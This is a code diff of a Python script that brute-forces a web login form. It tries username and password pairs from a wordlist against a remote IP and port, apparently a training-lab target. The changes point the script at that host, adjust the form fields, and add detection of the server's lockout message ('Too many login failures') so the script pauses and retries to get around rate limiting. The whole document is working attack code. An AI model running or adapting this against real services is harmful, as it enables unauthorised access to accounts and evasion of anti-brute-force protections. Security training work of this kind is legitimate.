@@ -4,20 +4,21 @@ import requests
 import os.path
 
 # define target TARGET_URL, change as needed
-TARGET_URL = "http://127.0.0.1:5000"
+TARGET_URL = "http://94.237.48.48:45256/"
 
 # define a fake HEADERS to present ourself as Chromium browser, change if needed
 HEADERS = {
   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
   }
 
-# define the string expected if SUCCESS_STRING account has been found. our basic PHP example replies with Welcome in case of success
-
+# Investigate source code for success, failure and timeout strings
 SUCCESS_STRING = None
 FAILURE_STRING = "Invalid credentials"
+TIMEOUT_STRING = "Too many login failures, please wait"
 
-REQUEST_PAUSE         = 45
-REQUEST_PER_TIMEFRAME = 5
+# Investigate source code for the timeout period for login attempts (seconds)
+REQUEST_PAUSE  = 45
+
 """
 wordlist is expected as simple list, we keep this function to have it ready if needed.
 for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
@@ -30,10 +31,10 @@ def unpack(fline):
   return userid, passwd
 
 """
-our PHP example accepts requests via POST, and requires parameters as userid and passwd
+POST request, change request fields as needed in the data variable
 """
 def do_req(TARGET_URL, userid, passwd, HEADERS):
-  data = {"username": userid, "password": passwd}
+  data = {"userid": userid, "passwd": passwd, "submit": "submit"}
   res = requests.post(url=TARGET_URL, headers=HEADERS, data=data)
   print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))
 
@@ -51,8 +52,6 @@ def main():
   # open the file, this is our wordlist
   with open(fname) as fh:
     # read file line by line
-    request_count = 1
-
     for fline in fh:
       # skip line if it starts with a comment
       if fline.startswith("#"):
@@ -61,20 +60,21 @@ def main():
       userid, passwd = unpack(fline.rstrip())
 
       # call do_req() to do the HTTP request
-      print("[-] Checking account {} {}".format(userid, passwd))
       res = do_req(TARGET_URL, userid, passwd, HEADERS)
       
+      # If the timeout string has been detected 
+      if res.find(TIMEOUT_STRING) != -1:
+        print(f"[!] Hit maximum number of requests!")
+        print(f"[-] Restarting in {REQUEST_PAUSE} seconds")
+        time.sleep(REQUEST_PAUSE)
+        res = do_req(TARGET_URL, userid, passwd, HEADERS)
+      
       # Process the response
+      print("[-] Checking account {} {}".format(userid, passwd))
+    
       if res.find(FAILURE_STRING) == -1:
         print(res)
 
-      if request_count % REQUEST_PER_TIMEFRAME == 0:
-        print(f"[!] Hit maximum number of requests ({REQUEST_PER_TIMEFRAME})")
-        print(f"[-] Restarting in {REQUEST_PAUSE} seconds")
-        time.sleep(REQUEST_PAUSE)
-
-      request_count += 1
 
 if __name__ == "__main__":
   main()
-
